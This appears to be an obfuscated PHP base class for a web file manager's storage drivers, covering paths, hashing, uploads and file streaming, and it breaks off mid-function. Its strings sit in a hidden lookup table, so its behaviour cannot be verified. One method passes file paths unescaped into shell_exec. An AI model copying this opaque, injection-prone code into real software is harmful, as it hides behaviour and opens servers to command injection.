<?php
 goto f…×…Éğº; EÁ·ÓÖ‡¯: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $î‡¶ü‡Ÿ =& $_SERVER[™¸œØ®Ü]; $this->objectDriver = array($î‡¶ü‡Ÿ[60], $î‡¶ü‡Ÿ[61], $î‡¶ü‡Ÿ[62], $î‡¶ü‡Ÿ[63], $î‡¶ü‡Ÿ[64], $î‡¶ü‡Ÿ[65], $î‡¶ü‡Ÿ[66], $î‡¶ü‡Ÿ[67], $î‡¶ü‡Ÿ[68], $î‡¶ü‡Ÿ[69], $î‡¶ü‡Ÿ[70], $î‡¶ü‡Ÿ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($š–Éûô) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($š–Éûô, $_SERVER[™¸œØ®Ü][8]); } return $š–Éûô; } public function iconvApp($òÆ¿ªÍ) { return $òÆ¿ªÍ; } public function iconvSystem($áúºóåæ) { return $áúºóåæ; } public function iconvTo($ßû´ğ¾, $ÂĞÈ¯ºÇ, $¹Š“Â) { $³‹ËÊ´ª =& $_SERVER[™¸œØ®Ü]; if (!$ßû´ğ¾ || !function_exists($³‹ËÊ´ª[72])) { return $ßû´ğ¾; } static $Ì«ë³­ = array(); $’ßÌ­µ = $ÂĞÈ¯ºÇ . $³‹ËÊ´ª[73] . $¹Š“Â . $³‹ËÊ´ª[74] . $ßû´ğ¾; if (isset($Ì«ë³­[$’ßÌ­µ])) { return $Ì«ë³­[$’ßÌ­µ]; } if (function_exists($³‹ËÊ´ª[75])) { $’”ü¹Ñà = @mb_convert_encoding($ßû´ğ¾, $¹Š“Â, $ÂĞÈ¯ºÇ); } else { $’”ü¹Ñà = @iconv($ÂĞÈ¯ºÇ, $¹Š“Â, $ßû´ğ¾); } $’”ü¹Ñà = $’”ü¹Ñà ? $’”ü¹Ñà : $ßû´ğ¾; if (strstr($’”ü¹Ñà, $³‹ËÊ´ª[76])) { $’”ü¹Ñà = str_replace($³‹ËÊ´ª[76], $³‹ËÊ´ª[11], $’”ü¹Ñà); } $Ì«ë³­[$ÂĞÈ¯ºÇ . $³‹ËÊ´ª[73] . $¹Š“Â . $³‹ËÊ´ª[74] . $ßû´ğ¾] = $’”ü¹Ñà; $Ì«ë³­[$¹Š“Â . $³‹ËÊ´ª[73] . $ÂĞÈ¯ºÇ . $³‹ËÊ´ª[74] . $ßû´ğ¾] = $ßû´ğ¾; $Ì«ë³­[$¹Š“Â . $³‹ËÊ´ª[73] . $ÂĞÈ¯ºÇ . $³‹ËÊ´ª[74] . $’”ü¹Ñà] = $ßû´ğ¾; $Ì«ë³­[$ÂĞÈ¯ºÇ . $³‹ËÊ´ª[73] . $¹Š“Â . $³‹ËÊ´ª[74] . $’”ü¹Ñà] = $’”ü¹Ñà; return $’”ü¹Ñà; } public function getPathInner($—ÁÒ„Ÿ£) { $åóÙ§²İ = IO::init($—ÁÒ„Ÿ£); return $åóÙ§²İ->path; } public function getPathOuter($²¥ñêÌ£) { $šì†Ãúç =& $_SERVER[™¸œØ®Ü]; $‘Õ‰ÚÉ = strlen(trim($this->pathBase, $šì†Ãúç[8])); $²¥ñêÌ£ = substr(trim($²¥ñêÌ£, $šì†Ãúç[8]), $‘Õ‰ÚÉ); return $this->pathDriver . $šì†Ãúç[8] . ltrim($²¥ñêÌ£, $šì†Ãúç[8]); } public function isParentOf($Çğ¯üñ¹, $×™ùÄ ª) { $¼¿’Öµ¼ =& $_SERVER[™¸œØ®Ü]; $Çğ¯üñ¹ = rtrim(strtolower($Çğ¯üñ¹), $¼¿’Öµ¼[8]) . $¼¿’Öµ¼[8]; $×™ùÄ ª = rtrim(strtolower($×™ùÄ ª), $¼¿’Öµ¼[8]) . $¼¿’Öµ¼[8]; $àŠ»áÌ¼ = strpos($×™ùÄ ª, $Çğ¯üñ¹) === 0; return $àŠ»áÌ¼; } public function getType() { $°€ç…ü =& $_SERVER[™¸œØ®Ü]; $ç­ÊÀ© = str_replace($°€ç…ü[77], $°€ç…ü[12], get_class($this)); return strtolower($ç­ÊÀ©); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¦‡İæ¹í, $ö©“˜³ü) { $ˆóèÍÃë =& $_SERVER[™¸œØ®Ü]; $‰¦¸…ÈŠ = rtrim($¦‡İæ¹í, $ˆóèÍÃë[8]) . $ˆóèÍÃë[8] . $ö©“˜³ü; $©‹Í…éÒ = $this->exist($‰¦¸…ÈŠ); return $©‹Í…éÒ ? $‰¦¸…ÈŠ : !1; } public function setModifyTime($è®‘ÄÙ‰, $ËÆ¤Éßı = '') { } public function renameObject($¨¶æ…Ÿ¯, $ÜÀ˜Œ¤À) { $Êº¢ò­â = $ÜÀ˜Œ¤À; $¨¶æ…Ÿ¯ = $this->getPathOuter($¨¶æ…Ÿ¯); $ÜÀ˜Œ¤À = $this->pathFather($¨¶æ…Ÿ¯) . $ÜÀ˜Œ¤À; $ÍÂ¸êèØ = IO::copy($¨¶æ…Ÿ¯, $this->pathFather($¨¶æ…Ÿ¯), REPEAT_RENAME_FOLDER, $Êº¢ò­â); if ($ÍÂ¸êèØ) { IO::remove($¨¶æ…Ÿ¯); } return $ÍÂ¸êèØ ? $ÜÀ˜Œ¤À : !1; } public function tempFile($å°ĞÕà¦ = '', $âß›”ıö = '') { if (!$å°ĞÕà¦) { $å°ĞÕà¦ = rand_string(15); } $à›Ä¯çÚ = TEMP_FILES . rand_string(15) . $_SERVER[™¸œØ®Ü][8]; @mkdir($à›Ä¯çÚ, DEFAULT_PERRMISSIONS, !0); $úƒÚ»½ = $à›Ä¯çÚ . $å°ĞÕà¦; @touch($úƒÚ»½); if ($âß›”ıö) { file_put_contents($úƒÚ»½, $âß›”ıö); } return $úƒÚ»½; } public function tempFileRemve($±«ğÒæ„) { @unlink($±«ğÒæ„); @rmdir($this->pathFather($±«ğÒæ„)); } public function mkfile($Ÿœ¨‘ƒç, $±¹¯õ—Ï = '', $†•Â‹£Ù = REPEAT_RENAME) { } public function mkdir($œ³Ùì´, $½×“´ = REPEAT_SKIP) { } public function delFile($¤ËöªØ) { } public function delFolder($Ö»İÔÑ) { } public function copyFile($ïÎŠãÊ¢, $ßÆ—™°Å) { } public function moveFile($×îˆä§‰, $õÄ†ßù©) { } public function remove($øµ™ƒƒ„) { if ($this->isFile($øµ™ƒƒ„)) { return $this->delFile($øµ™ƒƒ„); } return $this->delFolder($øµ™ƒƒ„); } public function rename($Û§·Æõ, $º´Ú«²‡) { } public function exist($‰üüØ¸Ì) { } public function findByHash($³©¬ì±© = '', $ûÜŠß€† = '') { return !1; } public function isFile($ùÇ¼É’æ) { } public function isFolder($¤×ŠÅíÅ) { } public function size($×¬ï‹ó) { } public function info($ñë¯õÁ) { } public function infoSimple($ü‘»÷²) { return $this->info($ü‘»÷²); } public function infoAuth($öˆæşµ) { return $this->info($öˆæşµ); } public function infoFull($Í¼í–Àü) { return $this->info($Í¼í–Àü); } public function infoFullSimple($¯åîÏÂ) { return $this->info($¯åîÏÂ); } public function infoWithChildren($¼ƒ±øÎí) { $Ì”ç™¨® =& $_SERVER[™¸œØ®Ü]; static $Ó•ìà¼ş = array(); if (isset($Ó•ìà¼ş[$¼ƒ±øÎí])) { return $Ó•ìà¼ş[$¼ƒ±øÎí]; } $Å‹€¹‰ = $this->info($¼ƒ±øÎí); if ($Å‹€¹‰ && $Å‹€¹‰[$Ì”ç™¨®[33]] == $Ì”ç™¨®[78]) { $´ ÉŞã = array($Ì”ç™¨®[79] => 0, $Ì”ç™¨®[80] => 0, $Ì”ç™¨®[81] => 0); $this->infoChildren($¼ƒ±øÎí, $´ ÉŞã); $Å‹€¹‰[$Ì”ç™¨®[79]] = $´ ÉŞã[$Ì”ç™¨®[79]]; $Å‹€¹‰[$Ì”ç™¨®[82]] = array($Ì”ç™¨®[83] => $´ ÉŞã[$Ì”ç™¨®[80]], $Ì”ç™¨®[84] => $´ ÉŞã[$Ì”ç™¨®[81]]); $Ó•ìà¼ş[$¼ƒ±øÎí] = $Å‹€¹‰; } return $Å‹€¹‰; } public function listPath($•á¯ƒğ€, $ø¼İ»¤ = false) { } public function has($àğş´ˆ, $¬Ñ·° = false, $œõµÓ÷ = false) { } public function canRead($İã£·Êé) { } public function canWrite($¤ŞÚˆ²É) { } public function getContent($­Ö–Ã) { } public function setContent($İÙøãä, $˜¦±ÓÏ = '') { } protected function infoChildren($Ìãı­÷Ê, &$“Ò‘ôÑ“) { $ØåúÚ¨ =& $_SERVER[™¸œØ®Ü]; check_abort_echo(); $˜äã¯ = $this->listPath($Ìãı­÷Ê, !0); $˜äã¯ = array_merge($˜äã¯[$ØåúÚ¨[85]], $˜äã¯[$ØåúÚ¨[86]]); foreach ($˜äã¯ as $Ê¶¼Ê‚ ) { if ($Ê¶¼Ê‚ [$ØåúÚ¨[33]] == $ØåúÚ¨[78]) { $“Ò‘ôÑ“[$ØåúÚ¨[81]]++; $’³¡±Ù = $this->getPathInner($Ê¶¼Ê‚ [$ØåúÚ¨[87]]); $this->infoChildren($’³¡±Ù, $“Ò‘ôÑ“); } else { $“Ò‘ôÑ“[$ØåúÚ¨[80]]++; $“Ò‘ôÑ“[$ØåúÚ¨[79]] += $Ê¶¼Ê‚ [$ØåúÚ¨[79]]; } } } public function fileSubstr($’§şèö¹, $­©Ş»—À, $Ã¹ßË˜Ü) { } public function listAll($¸¯³Êš³) { } public function listAllMake($âß¹êµ, &$×ÂåÑØÜ) { $ŞŸéŞË¦ =& $_SERVER[™¸œØ®Ü]; check_abort_echo(); $î—àà¤ = $this->listPath($âß¹êµ, !0); if (!$î—àà¤) { return; } $±Æõ¯¤ = array_merge($î—àà¤[$ŞŸéŞË¦[85]], $î—àà¤[$ŞŸéŞË¦[86]]); foreach ($±Æõ¯¤ as $şç•¨§³) { $Ïà±­Â… = $şç•¨§³[$ŞŸéŞË¦[33]] == $ŞŸéŞË¦[78]; $•ê¦·³Ë = array($ŞŸéŞË¦[87] => $şç•¨§³[$ŞŸéŞË¦[87]], $ŞŸéŞË¦[78] => $Ïà±­Â…); if (isset($şç•¨§³[$ŞŸéŞË¦[79]])) { $•ê¦·³Ë[$ŞŸéŞË¦[79]] = $şç•¨§³[$ŞŸéŞË¦[79]]; } if (isset($şç•¨§³[$ŞŸéŞË¦[88]])) { $•ê¦·³Ë[$ŞŸéŞË¦[88]] = $şç•¨§³[$ŞŸéŞË¦[88]]; } if (!$Ïà±­Â…) { $×ÂåÑØÜ[] = $•ê¦·³Ë; continue; } $×ÂåÑØÜ[] = $•ê¦·³Ë; $ÆÍµôŒ… = $şç•¨§³[$ŞŸéŞË¦[87]]; $Û˜ˆÃ˜ú = $this->pathDriver; if (substr($şç•¨§³[$ŞŸéŞË¦[87]], 0, strlen($Û˜ˆÃ˜ú)) == $Û˜ˆÃ˜ú) { $ÆÍµôŒ… = substr($ÆÍµôŒ…, strlen($Û˜ˆÃ˜ú)); } $this->listAllMake($ÆÍµôŒ…, $×ÂåÑØÜ); } } public function listAllSimple($èâ„ÙÑ, $§ó‹ÜÍ = false) { $Ç‹èî = $this->listAll($èâ„ÙÑ); return $this->listAllSimpleMake($Ç‹èî, $this->getPathOuter($èâ„ÙÑ), $§ó‹ÜÍ); } public function listAllSimpleMake($Ò›áõÆ, $—´¥ÃüÅ, $Íœ’ì£) { $Åµ™ì¯Š =& $_SERVER[™¸œØ®Ü]; $Û–ĞëÄõ = array(); $—´¥ÃüÅ = rtrim(get_path_father($—´¥ÃüÅ), $Åµ™ì¯Š[8]) . $Åµ™ì¯Š[8]; foreach ($Ò›áõÆ as $şé¿Œíõ) { $“ª«öÔ = array($Åµ™ì¯Š[87] => $şé¿Œíõ[$Åµ™ì¯Š[87]], $Åµ™ì¯Š[89] => $şé¿Œíõ[$Åµ™ì¯Š[87]], $Åµ™ì¯Š[78] => $şé¿Œíõ[$Åµ™ì¯Š[78]]); if (isset($şé¿Œíõ[$Åµ™ì¯Š[79]]) && !$şé¿Œíõ[$Åµ™ì¯Š[78]]) { $“ª«öÔ[$Åµ™ì¯Š[79]] = $şé¿Œíõ[$Åµ™ì¯Š[79]]; } if (isset($şé¿Œíõ[$Åµ™ì¯Š[88]])) { $“ª«öÔ[$Åµ™ì¯Š[88]] = $şé¿Œíõ[$Åµ™ì¯Š[88]]; } if (is_array($şé¿Œíõ[$Åµ™ì¯Š[90]])) { $“ª«öÔ[$Åµ™ì¯Š[89]] = $şé¿Œíõ[$Åµ™ì¯Š[90]][$Åµ™ì¯Š[87]]; $“ª«öÔ[$Åµ™ì¯Š[79]] = $şé¿Œíõ[$Åµ™ì¯Š[90]][$Åµ™ì¯Š[79]]; $“ª«öÔ[$Åµ™ì¯Š[88]] = $şé¿Œíõ[$Åµ™ì¯Š[90]][$Åµ™ì¯Š[88]]; } else { if (substr($şé¿Œíõ[$Åµ™ì¯Š[87]], 0, strlen($—´¥ÃüÅ)) == $—´¥ÃüÅ) { $“ª«öÔ[$Åµ™ì¯Š[87]] = substr($şé¿Œíõ[$Åµ™ì¯Š[87]], strlen($—´¥ÃüÅ)); } } $ÁîÓÓõ = $şé¿Œíõ[$Åµ™ì¯Š[78]] ? $Åµ™ì¯Š[8] : $Åµ™ì¯Š[12]; $“ª«öÔ[$Åµ™ì¯Š[89]] = rtrim($“ª«öÔ[$Åµ™ì¯Š[89]], $Åµ™ì¯Š[8]) . $ÁîÓÓõ; $“ª«öÔ[$Åµ™ì¯Š[87]] = $Åµ™ì¯Š[8] . trim($“ª«öÔ[$Åµ™ì¯Š[87]], $Åµ™ì¯Š[8]) . $ÁîÓÓõ; if (!$Íœ’ì£) { $úš‚Ã»¨ = explode($Åµ™ì¯Š[8], trim($“ª«öÔ[$Åµ™ì¯Š[87]], $Åµ™ì¯Š[8])); $“ª«öÔ[$Åµ™ì¯Š[87]] = $Åµ™ì¯Š[8] . implode($Åµ™ì¯Š[8], array_slice($úš‚Ã»¨, 1)) . $ÁîÓÓõ; } $Û–ĞëÄõ[] = $“ª«öÔ; } return array_sort_by($Û–ĞëÄõ, $Åµ™ì¯Š[87]); } public function upload($ŞÎ§½á«, $Èàî«¥œ, $¾—ù¯”¼ = false, $ø÷ÍÔ¦ = REPEAT_REPLACE) { } public function uploadFileByID($„­­şú, $Á²“¿€Õ, $öï±ÔåÚ) { } public function uploadFileByPath($ˆ ö×£§, $Û×†–º, $¬ş“À¹ = array()) { } public function isUploadServer() { $„¸î‡ÀÈ =& $_SERVER[™¸œØ®Ü]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $„¸î‡ÀÈ[91]) { return !0; } return $GLOBALS[$„¸î‡ÀÈ[6]][$„¸î‡ÀÈ[92]][$„¸î‡ÀÈ[93]]; } public function isFileOutServer() { $ˆ£Ïç°ü =& $_SERVER[™¸œØ®Ü]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ˆ£Ïç°ü[91]) { return !0; } return $GLOBALS[$ˆ£Ïç°ü[6]][$ˆ£Ïç°ü[92]][$ˆ£Ïç°ü[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ñ…ìİ¡È) { $‘ğ€À¢Ã =& $_SERVER[™¸œØ®Ü]; if (!$this->isCdnHost()) { return $ñ…ìİ¡È; } return str_replace(trim(get_url_root($ñ…ìİ¡È), $‘ğ€À¢Ã[8]), trim($this->cdnHost, $‘ğ€À¢Ã[8]), $ñ…ìİ¡È); } public function uploadLink($€™ØÜìù, $æ­²°¤ = 0) { $ ¶ÒËÛ =& $_SERVER[™¸œØ®Ü]; if ($this->isUploadServer()) { return; } $œŸ‡ßè = $this->getType(); if (!in_array($œŸ‡ßè, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¥«ƒ”êÄ = 1024 * 1024 * 10; $ÕŠŞ½»‘ = $æ­²°¤ <= $¥«ƒ”êÄ ? $ ¶ÒËÛ[95] : $ ¶ÒËÛ[96]; $Ù™ÒÚÑ = (!$æ­²°¤ ? 1 : ceil($æ­²°¤ / pow(1024, 3))) * 3600 * 4; $àø¼ß’ = $this->{$ÕŠŞ½»‘}($€™ØÜìù, $Ù™ÒÚÑ); if ($àø¼ß’) { $àø¼ß’[$ ¶ÒËÛ[97]] = $€™ØÜìù; $àø¼ß’[$ ¶ÒËÛ[98]] = $œŸ‡ßè; } return $àø¼ß’; } public function uploadFormData($€Ã¶È‡, $Æ¸Ã¸ = 3600) { } public function uploadMultiData($Ã½ì¢¨í, $çÈäÀÉù = 3600) { } public function multiUploadFormData($œĞÈ Åá, $–²“ãô = 3600) { return $this->uploadMultiData($œĞÈ Åá, $–²“ãô); } public function download($èÌê÷…­, $µÁ·ëñ´) { } public function ext($”ÌÊşº€) { $–ÍÚê¯ =& $_SERVER[™¸œØ®Ü]; if (strpos($”ÌÊşº€, $–ÍÚê¯[8]) === -1) { $ÃÔ¨Š¦ = $”ÌÊşº€; } else { $ÃÔ¨Š¦ = $this->pathThis($”ÌÊşº€); } $“óï­É = $–ÍÚê¯[12]; if (strstr($ÃÔ¨Š¦, $–ÍÚê¯[10])) { $“óï­É = substr($ÃÔ¨Š¦, strrpos($ÃÔ¨Š¦, $–ÍÚê¯[10]) + 1); $“óï­É = strtolower($“óï­É); } if (strlen($“óï­É) > 3 && preg_match($–ÍÚê¯[99], $“óï­É, $îôÅ×)) { $“óï­É = $–ÍÚê¯[12]; } return $“óï­É; } public function pathThis($É»âø†) { $ëç±šŸÁ =& $_SERVER[™¸œØ®Ü]; $É»âø† = str_replace($ëç±šŸÁ[100], $ëç±šŸÁ[8], rtrim($É»âø†, $ëç±šŸÁ[8])); $Î“Á´Ç· = strrpos($É»âø†, $ëç±šŸÁ[8]); if ($Î“Á´Ç· === !1) { return $É»âø†; } return substr($É»âø†, $Î“Á´Ç· + 1); } public function pathFather($‰Œ³±Æ´) { $ŒÛÚ¤Ş± =& $_SERVER[™¸œØ®Ü]; $‰Œ³±Æ´ = str_replace($ŒÛÚ¤Ş±[100], $ŒÛÚ¤Ş±[8], rtrim($‰Œ³±Æ´, $ŒÛÚ¤Ş±[8])); $Æø˜ÙÆŠ = strrpos($‰Œ³±Æ´, $ŒÛÚ¤Ş±[8]); if ($Æø˜ÙÆŠ === !1) { return $ŒÛÚ¤Ş±[12]; } return substr($‰Œ³±Æ´, 0, $Æø˜ÙÆŠ + 1); } public function hashSimple($Ì¡­õ‰) { $ğÁˆæì =& $_SERVER[™¸œØ®Ü]; if (!$Ì¡­õ‰) { return md5($ğÁˆæì[12]); } $ˆ´é ÌÚ = $this->size($Ì¡­õ‰); $¸Î¬Ë• = 200; $Ìİ”áã® = 50; if ($ˆ´é ÌÚ <= $¸Î¬Ë• * $Ìİ”áã®) { return $this->hashMd5($Ì¡­õ‰) . $ˆ´é ÌÚ; } $’õ®ë¼ = intval($ˆ´é ÌÚ / $Ìİ”áã®); $¦‹‡‡¯Ş = $ğÁˆæì[12]; for ($è©®ÕÕÈ = 0; $è©®ÕÕÈ < $Ìİ”áã®; $è©®ÕÕÈ++) { $¦‹‡‡¯Ş .= $this->fileSubstr($Ì¡­õ‰, $’õ®ë¼ * $è©®ÕÕÈ, $¸Î¬Ë•); } $¦‹‡‡¯Ş .= $this->fileSubstr($Ì¡­õ‰, $ˆ´é ÌÚ - $¸Î¬Ë•, $¸Î¬Ë•); return md5($¦‹‡‡¯Ş) . $ˆ´é ÌÚ; } public static $md5Cache = array(); public function hashMd5($´¨©ŠÌÁ) { if (!$´¨©ŠÌÁ) { return md5($_SERVER[™¸œØ®Ü][12]); } $´¨©ŠÌÁ = $this->iconvSystem($´¨©ŠÌÁ); if (isset(self::$md5Cache[$´¨©ŠÌÁ])) { return self::$md5Cache[$´¨©ŠÌÁ]; } self::$md5Cache[$´¨©ŠÌÁ] = $this->hashMd5Shell($´¨©ŠÌÁ); if (!self::$md5Cache[$´¨©ŠÌÁ]) { self::$md5Cache[$´¨©ŠÌÁ] = @md5_file($´¨©ŠÌÁ); } return self::$md5Cache[$´¨©ŠÌÁ]; } private function hashMd5Shell($…òÍé­) { $Öì¿ıÃ¬ =& $_SERVER[™¸œØ®Ü]; if (!$…òÍé­) { return md5($Öì¿ıÃ¬[12]); } if (!function_exists($Öì¿ıÃ¬[101])) { return !1; } $—ÉÅ¤Á¤ = array($Öì¿ıÃ¬[102], $Öì¿ıÃ¬[103]); $Ç É…È˜ = Cache::get($Öì¿ıÃ¬[104]); if (!$Ç É…È˜) { $¾¬šø¨í = BASIC_PATH . $Öì¿ıÃ¬[105]; $ŸëÄõÛÜ = md5_file($¾¬šø¨í); $Ç É…È˜ = $Öì¿ıÃ¬[106]; foreach ($—ÉÅ¤Á¤ as $ÜâĞ¢²­) { $¯İâ»¾‘ = shell_exec($ÜâĞ¢²­ . "\40\x22{$¾¬šø¨í}\42"); if ($¯İâ»¾‘ && substr(trim($¯İâ»¾‘), 0, 32) == $ŸëÄõÛÜ) { $Ç É…È˜ = $ÜâĞ¢²­; break; } } Cache::set($Öì¿ıÃ¬[104], $Ç É…È˜, 3600); } if ($Ç É…È˜ == $Öì¿ıÃ¬[106]) { return !1; } $¯İâ»¾‘ = shell_exec($Ç É…È˜ . "\40\42{$…òÍé­}\x22"); $¯İâ»¾‘ = str_replace($Öì¿ıÃ¬[107], $Öì¿ıÃ¬[12], $¯İâ»¾‘); return substr($¯İâ»¾‘, 0, 32); } public function link($ğïÊŠ¶Ë) { return $ğïÊŠ¶Ë; } public function fileOut($ÅÔ·íã„, $Œ‚´ã‹£ = false, $”¢©‘şà = false, $ñ¹¦Òø® = '') { $ëúÆñãé =& $_SERVER[™¸œØ®Ü]; $this->cacheMethod(null, null); if (!$ÅÔ·íã„ || !$this->exist($ÅÔ·íã„)) { show_json(LNG($ëúÆñãé[108]), !1, $”¢©‘şà); } $æ½ÚŸÃ× = $this->getType() == $ëúÆñãé[109]; $€ƒ©¨­¬ = $GLOBALS[$ëúÆñãé[6]][$ëúÆñãé[92]][$ëúÆñãé[110]][$ëúÆñãé[111]]; $¾×–¨Ğ = (double) $GLOBALS[$ëúÆñãé[6]][$ëúÆñãé[92]][$ëúÆñãé[110]][$ëúÆñãé[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ìô²•·ª = $this->infoFull($ÅÔ·íã„); $™™ãıƒó = $ìô²•·ª[$ëúÆñãé[79]]; $®ºÛ«Õè = gmdate($ëúÆñãé[113], $ìô²•·ª[$ëúÆñãé[88]]); $¼ßï¶Ù¢ = $”¢©‘şà ? $”¢©‘şà : $this->iconvApp($ìô²•·ª[$ëúÆñãé[32]]); $…ÙÑÇ» = 0; $á´ÃŞá³ = $™™ãıƒó - 1; $ıâ‡ã›â = $this->ext($¼ßï¶Ù¢); if (in_array($ıâ‡ã›â, array($ëúÆñãé[114], $ëúÆñãé[115], $ëúÆñãé[116], $ëúÆñãé[117]))) { $ıâ‡ã›â = $ëúÆñãé[118]; } if (in_array($ıâ‡ã›â, array($ëúÆñãé[119]))) { $ıâ‡ã›â = $ëúÆñãé[120]; } if (!$ñ¹¦Òø®) { $ñ¹¦Òø® = md5($®ºÛ«Õè . $™™ãıƒó); } $ñ¹¦Òø® = $ëúÆñãé[121] . $ñ¹¦Òø® . $ëúÆñãé[121]; $«ø¬·Ó¢ = get_file_mime($ıâ‡ã›â); $©ÈüÒİú = !0; $©ÈüÒİú = isset($_GET[$ëúÆñãé[122]]) ? !1 : !0; if ($Œ‚´ã‹£ === !1 && !mime_support($«ø¬·Ó¢)) { $«ø¬·Ó¢ = $ëúÆñãé[123]; } header($ëúÆñãé[124]); header($ëúÆñãé[125] . $«ø¬·Ó¢); $ô±‚õÃË = rawurlencode($¼ßï¶Ù¢); $ô±‚õÃË = $ëúÆñãé[121] . $ô±‚õÃË . $ëúÆñãé[126] . $ô±‚õÃË; if ($Œ‚´ã‹£) { header($ëúÆñãé[127]); header($ëúÆñãé[128] . $ô±‚õÃË); } else { if ($©ÈüÒİú) { header($ëúÆñãé[129] . $ô±‚õÃË); } } $ÕŒØì›Ç = 3600 * 24 * 30; header($ëúÆñãé[130]); header($ëúÆñãé[131]); header($ëúÆñãé[132] . $ÕŒØì›Ç); header($ëúÆñãé[133] . gmdate($ëúÆñãé[113], time() + $ÕŒØì›Ç) . $ëúÆñãé[134]); if (isset($_SERVER[$ëúÆñãé[135]]) && strtotime($_SERVER[$ëúÆñãé[135]]) == $ìô²•·ª[$ëúÆñãé[88]]) { header($ëúÆñãé[136], !0, 304); die; } if (isset($_SERVER[$ëúÆñãé[137]]) && $_SERVER[$ëúÆñãé[137]] == $ñ¹¦Òø®) { header($ëúÆñãé[138] . $ñ¹¦Òø®, !0, 304); die; } header($ëúÆñãé[138] . $ñ¹¦Òø®); header($ëúÆñãé[139] . $®ºÛ«Õè . $ëúÆñãé[134]); header($ëúÆñãé[140] . $¼ßï¶Ù¢); header($ëúÆñãé[141]); header($ëúÆñãé[142] . $™™ãıƒó); header($ëúÆñãé[143]); Hook::trigger($ëúÆñãé[144], $ÅÔ·íã„, $™™ãıƒó, $¼ßï¶Ù¢, $ıâ‡ã›â); if (!$Œ‚´ã‹£ && $ıâ‡ã›â == $ëúÆñãé[145]) { if ($™™ãıƒó > 1024 * 1024 * 5) { die; } $ÎÃ¯Û¼ = $this->getContent($ÅÔ·íã„); $ÎÃ¯Û¼ = Html::clearSVG($ÎÃ¯Û¼); header($ëúÆñãé[146] . strlen($ÎÃ¯Û¼)); echo $ÎÃ¯Û¼; die; } $¦Ó¿¤‘ç = strtolower($_SERVER[$ëúÆñãé[147]]); if ($æ½ÚŸÃ× && $¦Ó¿¤‘ç && $€ƒ©¨­¬) { if (strstr($¦Ó¿¤‘ç, $ëúÆñãé[148])) { header($ëúÆñãé[149] . $ÅÔ·íã„); } else { if (strstr($¦Ó¿¤‘ç, $ëúÆñãé[150])) { header($ëúÆñãé[151] . $ÅÔ·íã„); } else { if (strstr($¦Ó¿¤‘ç, $ëúÆñãé[152])) { header($ëúÆñãé[153] . $ÅÔ·íã„); } } } if ($¾×–¨Ğ) { header($ëúÆñãé[154] . $¾×–¨Ğ); } return; } if (isset($_SERVER[$ëúÆñãé[155]])) { if (preg_match($ëúÆñãé[156], $_SERVER[$ëúÆñãé[155]], $Ü³³)) { $…ÙÑÇ» = intval($Ü³³[1]); $…ÙÑÇ» = $…ÙÑÇ» <= 0 ? 0 : ($…ÙÑÇ» >= $á´ÃŞá³ ? $á´ÃŞá³ : $…ÙÑÇ»); if (!empty($Ü³³[2])) { $³¶íŠÂ = intval($Ü³³[2]); $á´ÃŞá³ = $³¶íŠÂ < $…ÙÑÇ» ? $…ÙÑÇ» : ($³¶íŠÂ >= $á´ÃŞá³ ? $á´ÃŞá³ : $³¶íŠÂ); } } header($ëúÆñãé[157]); header("\x43\x6f\x6e\164\145\x6e\164\55\122\141\156\x67\x65\x3a\x20\x62\171\164\x65\x73\40{$…ÙÑÇ»}\x2d{$á´ÃŞá³}\x2f" . $™™ãıƒó); } else { header($ëúÆñãé[158]); } header($ëúÆñãé[159]); header($ëúÆñãé[160]); $ÜÃ†ğÍÍ = !0; if ($_SERVER[$ëúÆñãé[161]] == $ëúÆñãé[162] && $™™ãıƒó > 1204 * 1024 * 1024 * 2) { $ÜÃ†ğÍÍ = !1; } if ($ÜÃ†ğÍÍ) { header($ëúÆñãé[163] . ($á´ÃŞá³ - $…ÙÑÇ» + 1)); } if ($_SERVER[$ëúÆñãé[164]] == $ëúÆñãé[165]) { return; } $Ã¸œ—± = array($ëúÆñãé[166] => !1, $ëúÆñãé[167] => $…ÙÑÇ», $ëúÆñãé[168] => $á´ÃŞá³, $ëúÆñãé[169] => $ıâ‡ã›â, $ëúÆñãé[170] => $ìô²•·ª, $ëúÆñãé[171] => $ëúÆñãé[12], $ëúÆñãé[172] => 0); $Ã¸œ—± = Hook::filter($ëúÆñãé[173], $Ã¸œ—±); $–ÆŠ×ˆ— = 1024 * 300; $Ûä ä¦ = 0; if ($¾×–¨Ğ) { $Ûä ä¦ = intval(1000 * 1000 * ($–ÆŠ×ˆ— / $¾×–¨Ğ)); } while ($…ÙÑÇ» <= $á´ÃŞá³) { $È´¥ É× = timeFloat(); check_abort(); $€´–Ó®‚ = $á´ÃŞá³ - $…ÙÑÇ» + 1; if ($€´–Ó®‚ <= $–ÆŠ×ˆ—) { $–ÆŠ×ˆ— = $€´–Ó®‚; } $ÎÃ¯Û¼ = $this->fileSubstr($ÅÔ·íã„, $…ÙÑÇ», $–ÆŠ×ˆ—); if ($Ã¸œ—±[$ëúÆñãé[166]]) { $Ã¸œ—±[$ëúÆñãé[171]] = $ÎÃ¯Û¼; $Ã¸œ—±[$ëúÆñãé[172]] = $…ÙÑÇ»; $Ã¸œ—± = Hook::filter($ëúÆñãé[174], $Ã¸œ—±); $ÎÃ¯Û¼ = $Ã¸œ—±[$ëúÆñãé[171]]; } echo $ÎÃ¯Û¼; $…ÙÑÇ» += $–ÆŠ×ˆ—; if ($–ÆŠ×ˆ— == $€´–Ó®‚) { $…ÙÑÇ» = $á´ÃŞá³ + 1; } if ($Ûä ä¦) { $Ø™×ò„Ï = intval(1000 * 1000 * (timeFloat() - $È´¥ É×)); $˜¶ŠšÄ° = $Ûä ä¦ - $Ø™×ò„Ï; if ($˜¶ŠšÄ° > 5) { usleep($˜¶ŠšÄ°); } } } } public function fileOutServer($¨Í†Åê, $é§ØÆ—û = false, $Òå¾á÷È = false, $Ğ°…ıçƒ = '') { $this->fileOut($¨Í†Åê, $é§ØÆ—û, $Òå¾á÷È, 